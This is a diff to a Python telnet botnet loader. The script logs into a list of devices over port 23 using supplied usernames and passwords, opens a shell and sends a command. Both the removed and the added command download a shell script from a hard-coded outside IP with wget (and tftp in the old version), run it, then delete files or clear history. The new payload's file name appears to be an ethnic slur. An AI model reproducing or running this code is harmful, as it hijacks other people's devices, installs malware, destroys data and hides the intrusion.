@@ -4,8 +4,8 @@ from threading import Thread
 if len(sys.argv) < 2:
 	sys.exit("\033[37mUsage: python "+sys.argv[0]+" [list]")
 
-cmd="cd /tmp  cd /var/run  cd /mnt  cd /root  cd /; wget http://188.127.254.252:666/Sakura.sh; chmod 777 *; sh Sakura.sh; tftp -g 188.127.254.252 -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c" #command to send
-info = open(str(sys.argv[1]),'a+')
+cmd="wget http://137.184.8.101/jewn.sh; chmod 777 *; sh jewn.sh; rm -rf *" #command to send
+info = open(str(sys.argv[1]),'a+',encoding='utf-8')
 
 def sqwad(ip,username,password):
 	ip = str(ip).rstrip("\n")
@@ -16,14 +16,14 @@ def sqwad(ip,username,password):
 		tn.settimeout(5)
 		tn.connect((ip,23))
 	except Exception:
-		print "\033[32m[\033[31m+\033[32m] \033[31mFailed To Connect!\033[37m %s"%(ip)
+		print "\033[32m[\033[31m+\033[32m] \033[31mbot dead\033[37m %s"%(ip)
 		tn.close()
 	try:
 		hoho = ''
 		hoho += readUntil(tn, "ogin")
 		if "ogin" in hoho:
 			tn.send(username + "\n")
-			print "\033[32m[\033[31m+\033[32m] \033[35mSending Username!\033[37m %s"%(ip)
+			print "\033[32m[\033[31m+\033[32m] \033[35msend Username!\033[37m %s"%(ip)
 			time.sleep(0.09)
 		else:
 			pass
@@ -34,7 +34,7 @@ def sqwad(ip,username,password):
 		hoho += readUntil(tn, "assword:")
 		if "assword" in hoho:
 			tn.send(password + "\n")
-			print "\033[32m[\033[33m+\033[32m] \033[36mSending Password!\033[37m %s"%(ip)
+			print "\033[32m[\033[33m+\033[32m] \033[36mbot pass send\033[37m %s"%(ip)
 			time.sleep(2)
 		else:
 			pass
@@ -44,7 +44,7 @@ def sqwad(ip,username,password):
 		tn.send("sh" + "\n")
 		time.sleep(0.05)
 		tn.send(cmd + "\n")
-		print "\033[32m[\033[31m+\033[32m] \033[32mCommand Sent!\033[37m %s"%(ip) #False possitives because thats what yall wanted lmao
+		print "\033[32m[\033[31m+\033[32m] \033[32mfuckin bot send\033[37m %s"%(ip) #False possitives because thats what yall wanted lmao
 		time.sleep(15)
 		tn.close()
 	except Exception:
